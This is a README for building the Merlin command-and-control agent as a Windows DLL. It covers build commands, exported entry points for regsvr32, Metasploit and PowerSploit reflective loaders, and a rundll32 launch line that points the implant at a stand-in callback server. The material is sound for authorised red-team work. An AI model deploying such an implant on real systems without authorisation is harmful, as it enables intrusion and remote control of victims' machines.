# Merlin Agent DLL
Merlin can be compiled into a DLL. The `data/bin/dll/merlin.c` file is
a very simple C file with a single function. The `VoidFunc` and `Run`
functions are exported to facilitate executing the DLL.
The `VoidFunc` function name was specifically chosen to facilitate use
with PowerSploit's
[Invoke-ReflectivePEInjection.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)
. Using `VoidFunc` requires no modification to run Merlin's DLL with
Invoke-ReflectivePEInjection.

If the DLL is compiled on Windows, the
[TDM-GCC](http://tdm-gcc.tdragon.net/download) 64bit compiler has proven
 to work well during testing.

If the DLL is compiled on Linux, ensure `MinGW-w64` is installed.

## Creating the DLL
The DLL can be created using the Make file with `make agent-dll`

Alternatively, it can be compiled without Make by following these steps:
* Create the required C archive file:
  * `cd data/bin/dll;go build -buildmode=c-archive ../../../cmd/merlinagentdll/main.go`

* Compile the DLL
  * `gcc -shared -pthread -o merlin.dll merlin.c main.a -lwinmm -lntdll -lws2_32`

You will now have DLL file that you can use with whatever method of
execution you would like.

## DLL Entry Points
This table catalogs the exported functions for `merlin.dll` that can be
used as an entry point when executing the DLL.

| Exported Function | Status | Notes
--- | --- | ---
| Run | Working | Main function to execute Merlin agent
| DllInstall | Partial | Used with regsvr32.exe /i . Handling for `/i` not implemented
| DllRegisterServer | Working | Used with regsvr32.exe
| DllUnregisterServer | Working | Used with regsvr32.exe /u
| ReflectiveLoader | Broken | Used with Metasploit's windows/manage/reflective_dll_inject module
| VoidFunc | Working | Used with PowerSploit's Invoke-ReflectivePEInjection.ps1

## Execution with Rundll32.exe
The DLL can be executed on a Windows host using the rundll32.exe
program. An example of using `rundll32` is:

`rundll32 merlin.dll,main` or `rundll32 merlin.dll,Run`

A different Merlin server _can_ be provided when executing the DLL by
suppling the target URL as an argument. An example is:

`rundll32 merlin.dll,Run https://yourdomian.com:443/`

## Invoke-Merlin
The compiled DLL can be inserted into the `Invoke-Merlin.ps1` script.
Check the [README](../powershell/README.MD) in the `powershell` directory for
additional details.

## Limitations
It is important to note that the DLL is currently in the
Proof-of-Concept stage. Because of this, there is no way to provide a
different Merlin server URL when calling `Invoke-Merlin`.
`Invoke-Merlin` will only call back to the Merlin server at
127.0.0.1. because that is the hard coded value. Future work will
facilitate specifying the value at compile time or when executing the
script. Work is in progress to overcome this issue.

One option to overcome this is to hard-code in the target Merlin server
address into the `url` variable of the `cmd/merlinagent/main.go` prior
to creating the C archive file.